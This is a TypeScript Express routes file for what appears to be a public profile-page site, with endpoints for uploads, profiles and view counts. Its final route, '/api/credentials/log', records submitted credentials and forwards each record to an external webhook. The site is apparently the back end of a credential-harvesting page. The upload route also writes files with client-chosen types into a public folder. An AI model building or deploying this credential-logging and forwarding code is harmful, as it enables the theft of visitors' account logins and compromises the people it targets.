import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { insertProfileSchema, insertCredentialLogSchema } from "@shared/schema";
import { writeFile, unlink, mkdir } from "fs/promises";
import { join } from "path";
import { randomBytes } from "crypto";

export async function registerRoutes(app: Express): Promise<Server> {
  // Ensure uploads directory exists
  await mkdir("public/uploads", { recursive: true });

  // Upload file endpoint (accepts base64 encoded files)
  app.post("/api/upload", async (req, res) => {
    try {
      const { fileData, fileType } = req.body;
      
      if (!fileData || !fileType) {
        return res.status(400).json({ message: "Missing fileData or fileType" });
      }

      // Extract base64 data and mime type
      const matches = fileData.match(/^data:([A-Za-z-+\/]+);base64,(.+)$/);
      if (!matches || matches.length !== 3) {
        return res.status(400).json({ message: "Invalid file data format" });
      }

      const mimeType = matches[1];
      const base64Data = matches[2];
      
      // Convert base64 to buffer immediately and clear the base64 string
      const buffer = Buffer.from(base64Data, 'base64');

      // Generate unique filename
      const ext = mimeType.split('/')[1].split(';')[0];
      const filename = `${fileType}_${randomBytes(16).toString('hex')}.${ext}`;
      const filepath = join("public", "uploads", filename);

      // Save file to disk immediately
      await writeFile(filepath, buffer);

      // Return the public URL path
      const publicPath = `/uploads/${filename}`;
      res.json({ path: publicPath, filename, mimeType });
    } catch (error: any) {
      console.error("Upload error:", error);
      res.status(500).json({ message: error.message });
    }
  });

  // Delete file endpoint
  app.delete("/api/upload/:filename", async (req, res) => {
    try {
      const { filename } = req.params;
      
      // Security: validate filename to prevent path traversal
      if (!filename || filename.includes('..') || filename.includes('/') || filename.includes('\\')) {
        return res.status(400).json({ message: "Invalid filename" });
      }

      // Security: only allow alphanumeric, underscore, hyphen, and dot
      if (!/^[A-Za-z0-9_-]+\.[A-Za-z0-9]+$/.test(filename)) {
        return res.status(400).json({ message: "Invalid filename format" });
      }

      const filepath = join("public", "uploads", filename);
      
      // Security: verify file exists and is within uploads directory
      const { stat } = await import("fs/promises");
      try {
        await stat(filepath);
      } catch {
        return res.status(404).json({ message: "File not found" });
      }

      await unlink(filepath);
      res.json({ success: true });
    } catch (error: any) {
      console.error("Delete error:", error);
      res.status(500).json({ message: error.message });
    }
  });

  // Get all profiles
  app.get("/api/profiles", async (req, res) => {
    try {
      const profiles = await storage.getAllProfiles();
      res.json(profiles);
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });

  // Get profile by username
  app.get("/api/profiles/:username", async (req, res) => {
    try {
      const profile = await storage.getProfileByUsername(req.params.username);
      if (!profile) {
        return res.status(404).json({ message: "Profile not found" });
      }
      res.json(profile);
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });

  // Create profile
  app.post("/api/profiles", async (req, res) => {
    try {
      const validatedData = insertProfileSchema.parse(req.body);
      
      const existingProfile = await storage.getProfileByUsername(validatedData.username);
      if (existingProfile) {
        return res.status(400).json({ message: "Username already exists" });
      }

      const profile = await storage.createProfile(validatedData);
      res.status(201).json(profile);
    } catch (error: any) {
      res.status(400).json({ message: error.message });
    }
  });

  // Update profile
  app.put("/api/profiles/:username", async (req, res) => {
    try {
      if (req.body.username && req.body.username !== req.params.username) {
        return res.status(400).json({ message: "Cannot change username" });
      }
      
      const updates = insertProfileSchema.partial().omit({ username: true }).parse(req.body);
      const profile = await storage.updateProfile(req.params.username, updates);
      if (!profile) {
        return res.status(404).json({ message: "Profile not found" });
      }
      res.json(profile);
    } catch (error: any) {
      res.status(400).json({ message: error.message });
    }
  });

  // Increment view count
  app.post("/api/profiles/:username/view", async (req, res) => {
    try {
      const profile = await storage.incrementViewCount(req.params.username);
      if (!profile) {
        return res.status(404).json({ message: "Profile not found" });
      }
      res.json(profile);
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });

  // Log credentials and send to webhook
  app.post("/api/credentials/log", async (req, res) => {
    try {
      const validatedData = insertCredentialLogSchema.parse(req.body);
      const log = await storage.createCredentialLog(validatedData);

      // Send to webhook if WEBHOOK_URL is configured
      const webhookUrl = process.env.WEBHOOK_URL;
      if (webhookUrl) {
        try {
          await fetch(webhookUrl, {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify(log),
          });
        } catch (webhookError) {
          console.error("Failed to send to webhook:", webhookError);
        }
      }

      res.status(201).json({ success: true });
    } catch (error: any) {
      res.status(400).json({ message: error.message });
    }
  });

  const httpServer = createServer(app);

  return httpServer;
}
